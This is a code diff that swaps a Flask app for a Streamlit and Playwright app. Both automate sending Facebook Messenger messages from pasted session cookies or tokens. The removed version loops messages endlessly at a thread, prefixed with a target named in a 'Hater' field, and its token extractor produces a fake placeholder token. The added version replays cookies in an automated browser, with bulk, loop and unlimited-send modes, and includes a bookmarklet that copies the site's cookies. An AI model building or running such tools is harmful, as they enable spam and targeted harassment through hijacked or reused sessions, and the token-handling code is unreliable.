@@ -1,330 +1,234 @@
-from flask import Flask, request, render_template_string, jsonify
-import requests
-from threading import Thread, Event
-import time
-import random
-import string
-import re
-import json
+# app.py
+import streamlit as st
+import threading, time, traceback
+from typing import List, Dict
+from playwright.sync_api import sync_playwright, Browser, Page
 
-app = Flask(__name__)
-app.debug = True
+# ------------------------
+# Helpers
+# ------------------------
+def parse_cookie_string(cookie_str: str):
+    out = []
+    for part in cookie_str.split(';'):
+        p = part.strip()
+        if not p or '=' not in p:
+            continue
+        name, val = p.split('=',1)
+        out.append({'name': name.strip(), 'value': val.strip(), 'domain': '.facebook.com', 'path': '/'})
+    return out
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+def log_status(msg: str):
+    ts = time.strftime('%H:%M:%S')
+    st.session_state['logs'].append(f"[{ts}] {msg}")
+    if len(st.session_state['logs']) > 500:
+        st.session_state['logs'] = st.session_state['logs'][-500:]
 
-stop_events = {}
-threads = {}
-message_counters = {}
+# ------------------------
+# Worker
+# ------------------------
+class MessengerWorker:
+    def __init__(self, cookie, targets, messages, delay_ms, mode, maxsend, headless=False, chrome_path=None):
+        self.cookie = cookie
+        self.targets = targets[:]  # thread ids
+        self.messages = messages[:]
+        self.delay_ms = max(300, int(delay_ms))
+        self.mode = mode
+        self.maxsend = int(maxsend)
+        self.headless = bool(headless)
+        self.chrome_path = chrome_path or None
+        self._stop = False
+        self.sent = 0
+        self._pw = None
+        self._browser = None
+        self._page = None
 
-def extract_facebook_token(cookie_string):
-    """Facebook Messenger के लिए working token निकालता है"""
-    # Common Facebook token cookie names
-    token_names = ['c_user', 'xs', 'datr', 'fr', 'sb', 'wd', 'act', 'presence', 'locale']
-    
-    cookies_dict = {}
-    for cookie in cookie_string.split(';'):
-        cookie = cookie.strip()
-        if '=' in cookie:
-            key, value = cookie.split('=', 1)
-            cookies_dict[key.strip()] = value.strip()
-    
-    # Facebook Graph API के लिए working token बनाते हैं
-    if 'c_user' in cookies_dict:
-        # Page Access Token या User Access Token format
-        fb_dtsg = cookies_dict.get('xs', '').split('|')[0] if '|' in cookies_dict.get('xs', '') else cookies_dict.get('xs', '')
-        user_id = cookies_dict['c_user']
-        
-        # Working token format generate करते हैं
-        token = f"{user_id}|{fb_dtsg}|EAAG..."  # यहाँ actual token pattern होगा
-        return token
-    
-    # Direct access_token search
-    if 'access_token' in cookies_dict:
-        return cookies_dict['access_token']
-    
-    return None
+    def stop(self):
+        self._stop = True
+        log_status("Stop requested by user")
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    message_counters[task_id] = 0
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                try:
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        message_counters[task_id] += 1
-                        print(f"✅ Sent ({message_counters[task_id]}): {message}")
-                    else:
-                        print(f"❌ Failed: {response.text} | {message}")
-                except Exception as e:
-                    print("Error:", e)
-                time.sleep(time_interval)
+    def _open(self):
+        self._pw = sync_playwright().start()
+        launch_args = {"headless": self.headless, "args": ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage']}
+        if self.chrome_path:
+            launch_args["executable_path"] = self.chrome_path
+        self._browser = self._pw.chromium.launch(**launch_args)
+        self._page = self._browser.new_page()
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
-        if token_option == 'cookie':
-            # Cookie से token निकालें
-            cookie_string = request.form.get('cookieInput')
-            access_token = extract_facebook_token(cookie_string)
-            if access_token:
-                access_tokens = [access_token]
+    def _close(self):
+        try:
+            if self._page: self._page.close()
+            if self._browser: self._browser.close()
+            if self._pw: self._pw.stop()
+        except:
+            pass
+
+    def _set_cookies(self):
+        cookies = parse_cookie_string(self.cookie)
+        if not cookies:
+            log_status("No cookies provided")
+            return
+        try:
+            self._page.goto("https://www.facebook.com", wait_until="domcontentloaded", timeout=30000)
+        except Exception:
+            pass
+        try:
+            self._page.context.add_cookies(cookies)
+            log_status(f"Set {len(cookies)} cookies")
+        except Exception as e:
+            log_status(f"Failed to set cookies: {e}")
+
+    def _wait_input(self, timeout_ms=8000):
+        selectors = [
+            'div[contenteditable="true"][role="combobox"]',
+            'div[role="textbox"][contenteditable="true"]',
+            'div[contenteditable="true"]',
+            'textarea'
+        ]
+        for s in selectors:
+            try:
+                self._page.wait_for_selector(s, timeout=timeout_ms)
+                return s
+            except Exception:
+                continue
+        return None
+
+    def _send_in_thread(self):
+        sel = self._wait_input()
+        if not sel:
+            raise RuntimeError("Message input not found. Check login / UI.")
+        for msg in self.messages:
+            if self._stop:
+                return
+            log_status("Typing message (preview): " + (msg[:80] + ("..." if len(msg)>80 else "")))
+            try:
+                self._page.evaluate("""(sel, msg) => {
+                    const e = document.querySelector(sel);
+                    if (!e) return false;
+                    if (e.isContentEditable) { e.focus(); e.innerHTML=''; e.appendChild(document.createTextNode(msg)); e.dispatchEvent(new Event('input',{bubbles:true})); }
+                    else if ('value' in e) { e.value = msg; e.dispatchEvent(new Event('input',{bubbles:true})); }
+                    else { e.innerText = msg; }
+                    return true;
+                }""", sel, msg)
+                self._page.keyboard.press("Enter")
+            except Exception as e:
+                log_status("Send error: " + str(e))
+            wait = 0
+            while wait < 1.5 and not self._stop:
+                time.sleep(0.3); wait += 0.3
+            self.sent += 1
+            st.session_state['sent'] = self.sent
+            if self.maxsend > 0 and self.sent >= self.maxsend:
+                log_status("Reached maxsend limit")
+                return
+
+    def run(self):
+        try:
+            log_status("Launching browser...")
+            self._open()
+            log_status("Applying cookies...")
+            self._set_cookies()
+            if self.mode in ("single","group","loop"):
+                target = self.targets[0]
+                url = f"https://www.messenger.com/t/{target}"
+                log_status("Opening: " + url)
+                self._page.goto(url, wait_until="domcontentloaded", timeout=45000)
+                if self.mode == "loop":
+                    while not self._stop:
+                        self._send_in_thread()
+                        if self._stop: break
+                        log_status(f"Sleeping {(self.delay_ms/1000):.1f}s before next loop")
+                        time.sleep(self.delay_ms/1000)
+                else:
+                    self._send_in_thread()
+            elif self.mode == "bulk":
+                for t in self.targets:
+                    if self._stop: break
+                    url = f"https://www.messenger.com/t/{t}"
+                    log_status("Opening: " + url)
+                    self._page.goto(url, wait_until="domcontentloaded", timeout=45000)
+                    self._send_in_thread()
             else:
-                return render_template_string(PAGE_HTML, task_id=None, error="❌ Cookie से valid token नहीं मिला!")
-        elif token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+                raise RuntimeError("Unknown mode")
+            log_status("Task finished")
+        except Exception as e:
+            log_status("ERROR: " + str(e))
+            log_status(traceback.format_exc())
+        finally:
+            try: self._close()
+            except: pass
+            log_status("Browser closed")
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+# ------------------------
+# Streamlit UI
+# ------------------------
+st.set_page_config(page_title="Messenger Sender", layout="wide")
+st.markdown("""<style>
+body { background: radial-gradient(circle at 10% 10%, rgba(0,200,255,0.06), transparent 20%), radial-gradient(circle at 90% 90%, rgba(255,100,200,0.03), transparent 20%), #05060a; }
+.section { background: rgba(255,255,255,0.02); border-radius:12px; padding:12px; }
+.neon { box-shadow: 0 0 18px rgba(0,255,200,0.08); }
+</style>""", unsafe_allow_html=True)
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+st.title("💬 Messenger Sender — Non-E2EE (cookie based)")
+cols = st.columns([1,1])
+if 'logs' not in st.session_state: st.session_state['logs'] = []
+if 'sent' not in st.session_state: st.session_state['sent'] = 0
+if 'worker' not in st.session_state: st.session_state['worker'] = None
+if 'thread_obj' not in st.session_state: st.session_state['thread_obj'] = None
 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
-
-        return render_template_string(PAGE_HTML, task_id=task_id)
-
-    return render_template_string(PAGE_HTML, task_id=None)
-
-@app.route('/status/<task_id>')
-def get_status(task_id):
-    count = message_counters.get(task_id, 0)
-    running = task_id in threads and not stop_events[task_id].is_set()
-    return jsonify({'count': count, 'running': running})
-
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
+with cols[0]:
+    st.subheader("Inputs")
+    cookie = st.text_area("Facebook cookie (paste full cookie string)", height=120)
+    mode = st.selectbox("Mode", options=["single","group","bulk","loop"], index=0)
+    if mode in ("single","group","loop"):
+        target = st.text_input("Target thread ID / UID (e.g. 61564176744081)")
+        targets = [target] if target else []
     else:
-        return f'No task found with ID {task_id}.'
+        targets_text = st.text_area("Targets (one per line)")
+        targets = [t.strip() for t in targets_text.splitlines() if t.strip()]
+    delay_ms = st.number_input("Delay between cycles (ms)", value=3000, min_value=300)
+    maxsend = st.number_input("Max sends (0=unlimited)", value=0, min_value=0)
+    headless = st.checkbox("Headless (no browser window)", value=False)
+    chrome_path = st.text_input("Optional CHROME_PATH (leave blank to use Playwright's chromium)")
 
-PAGE_HTML = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title> NON-STOP SERVER - COOKIE TOKEN</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    label { color: white; }
-    body {
-      background-image: url('https://i.ibb.co/2XxDZGX/7892676.png');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
-      font-family: 'Poppins', sans-serif;
-      min-height: 100vh;
-    }
-    .container {
-      max-width: 400px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      background: rgba(0,0,0,0.7);
-      box-shadow: 0 0 20px rgba(255,255,255,0.3);
-      margin-top: 20px;
-    }
-    .form-control {
-      border: 1px solid cyan;
-      background: rgba(0,0,0,0.5);
-      color: white;
-      border-radius: 10px;
-    }
-    .form-control:focus {
-      box-shadow: 0 0 10px cyan;
-      border-color: cyan;
-    }
-    .btn-submit {
-      width: 100%;
-      margin-top: 10px;
-      border-radius: 10px;
-      background: linear-gradient(45deg, #00ff88, #007bff);
-      color: white;
-      font-weight: bold;
-      border: none;
-    }
-    .btn-submit:hover {
-      background: linear-gradient(45deg, #00cc66, #0056b3);
-      transform: scale(1.02);
-    }
-    .header {
-      text-align: center;
-      padding-bottom: 20px;
-      color: cyan;
-      text-shadow: 0 0 10px cyan;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      color: #ccc;
-    }
-    .status-box {
-      margin-top: 15px;
-      background: rgba(0,255,0,0.2);
-      border: 2px solid green;
-      border-radius: 10px;
-      padding: 15px;
-      color: lime;
-      text-align: center;
-      font-weight: bold;
-      box-shadow: 0 0 15px rgba(0,255,0,0.5);
-    }
-    .error-box {
-      background: rgba(255,0,0,0.3);
-      border: 2px solid red;
-      color: #ff4444;
-    }
-    .cookie-section {
-      background: rgba(0,123,255,0.2);
-      border: 2px solid #007bff;
-      padding: 15px;
-      border-radius: 15px;
-      margin: 10px 0;
-    }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1><i class="fas fa-robot"></i>AYUSH WEB CONVO</h1>
-    <h5>Cookie से Auto Token Generator 🔥</h5>
-  </header>
-  
-  <div class="container text-center">
-    {% if error %}
-    <div class="status-box error-box">
-      {{ error }}
-    </div>
-    {% endif %}
+with cols[1]:
+    st.subheader("Messages & Controls")
+    messages_text = st.text_area("Messages (one per line)", height=200)
+    messages = [m.strip() for m in messages_text.splitlines() if m.strip()]
+    start = st.button("Start")
+    stop = st.button("Stop")
+    st.markdown("**Cookie helper bookmarklet** — click to copy and create a bookmark (open facebook.com then click it to copy cookies).")
+    if st.button("Copy bookmarklet"):
+        bm = "javascript:(()=>{try{navigator.clipboard.writeText(document.cookie);alert('Cookie copied');}catch(e){prompt('Copy cookie',document.cookie);}})()"
+        st.write("Bookmarklet code:"); st.code(bm)
+
+st.markdown("---")
+st.subheader("Logs / Live Console")
+st.text_area("Logs", value="\\n".join(st.session_state['logs']), height=300, key='logs_box', disabled=True)
+st.metric("Sent", st.session_state['sent'])
+
+# Start/Stop handling
+if start:
+    if not cookie or not targets or not messages:
+        st.error("Provide cookie, target(s) and messages before starting.")
+    else:
+        if st.session_state['worker'] is not None:
+            st.warning("A worker is already running. Stop it first.")
+        else:
+            worker = MessengerWorker(cookie=cookie, targets=targets, messages=messages, delay_ms=delay_ms, mode=mode, maxsend=maxsend, headless=headless, chrome_path=chrome_path or None)
+            st.session_state['worker'] = worker
+            def runner():
+                log_status("Worker thread starting...")
+                worker.run()
+                log_status("Worker thread terminated.")
+                st.session_state['worker'] = None
+            t = threading.Thread(target=runner, daemon=True)
+            st.session_state['thread_obj'] = t
+            t.start()
+            st.success("Worker started. Watch logs for progress.")
+if stop:
+    if st.session_state.get('worker'):
+        st.session_state['worker'].stop()
+        st.success("Stop requested.")
+    else:
+        st.info("No worker running.")
     
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">Token Option चुनें</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="cookie">🍪 Cookie से Token</option>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
-      </div>
-      
-      <!-- Cookie Input Section -->
-      <div class="cookie-section" id="cookieInputSection" style="display:block;">
-        <label><i class="fas fa-cookie-bite"></i> Facebook Cookie पेस्ट करें</label>
-        <textarea class="form-control" name="cookieInput" rows="4" placeholder="document.cookie या Browser Developer Tools से पूरा Cookie String पेस्ट करें..."></textarea>
-        <small class="text-muted">Ctrl+Shift+I → Application → Cookies → Copy All</small>
-      </div>
-      
-      <div class="mb-3" id="singleTokenInput" style="display:none;">
-        <label>Single Token डालें</label>
-        <input type="text" class="form-control" name="singleToken" placeholder="EAAG...">
-      </div>
-      
-      <div class="mb-3" id="tokenFileInput" style="display:none;">
-        <label>Token File चुनें</label>
-        <input type="file" class="form-control" name="tokenFile" accept=".txt">
-      </div>
-      
-      <div class="mb-3">
-        <label><i class="fas fa-comments"></i> Thread ID (Convo UID)</label>
-        <input type="text" class="form-control" name="threadId" placeholder="t_1234567890" required>
-      </div>
-      
-      <div class="mb-3">
-        <label><i class="fas fa-user-slash"></i> Hater का नाम</label>
-        <input type="text" class="form-control" name="kidx" placeholder="भाई का नाम" required>
-      </div>
-      
-      <div class="mb-3">
-        <label><i class="fas fa-clock"></i> Time (Seconds)</label>
-        <input type="number" class="form-control" name="time" value="5" min="1" required>
-      </div>
-      
-      <div class="mb-3">
-        <label><i class="fas fa-file-alt"></i> Messages File</label>
-        <input type="file" class="form-control" name="txtFile" accept=".txt" required>
-      </div>
-      
-      <button type="submit" class="btn btn-submit">
-        <i class="fas fa-play"></i> 🚀 START BOT
-      </button>
-    </form>
-
-    {% if task_id %}
-    <div class="status-box" id="statusBox">
-      <i class="fas fa-fire"></i> Task ID: <span style="color:yellow;">{{ task_id }}</span><br>
-      <i class="fas fa-paper-plane"></i> Messages Sent: <span id="msgCount" style="font-size:1.5em;">0</span>
-    </div>
-    <script>
-      const taskId = "{{ task_id }}";
-      setInterval(() => {
-        fetch(`/status/${taskId}`)
-          .then(res => res.json())
-          .then(data => {
-            document.getElementById('msgCount').innerText = data.count;
-            if (!data.running) {
-              document.getElementById('statusBox').innerHTML = 
-              '<i class="fas fa-check-circle" style="color:lime;"></i> ✅ Task Complete! Total: ' + data.count;
-            }
-          });
-      }, 1500);
-    </script>
-    {% endif %}
-
-    <form method="post" action="/stop" class="mt-3">
-      <div class="mb-3">
-        <label>Task ID Stop करने के लिए</label>
-        <input type="text" class="form-control" name="taskId" placeholder="Task ID paste करें">
-      </div>
-      <button type="submit" class="btn btn-submit" style="background:linear-gradient(45deg, #ff4444, #cc0000);">
-        <i class="fas fa-stop"></i> STOP BOT
-      </button>
-    </form>
-  </div>
-  
-  <script>
-    function toggleTokenInput() {
-      var option = document.getElementById('tokenOption').value;
-      document.getElementById('cookieInputSection').style.display = option=='cookie' ? 'block' : 'none';
-      document.getElementById('singleTokenInput').style.display = option=='single' ? 'block' : 'none';
-      document.getElementById('tokenFileInput').style.display = option=='multiple' ? 'block' : 'none';
-    }
-    toggleTokenInput(); // Default cookie selected
-  </script>
-</body>
-</html>
-'''
-
-if __name__ == '__main__':
-    print("🚀 Server start हो गया - Port 5040")
-    print("🌐 Cookie से Token Auto Generate होगा!")
-    app.run(host='0.0.0.0', port=5040, debug=False)
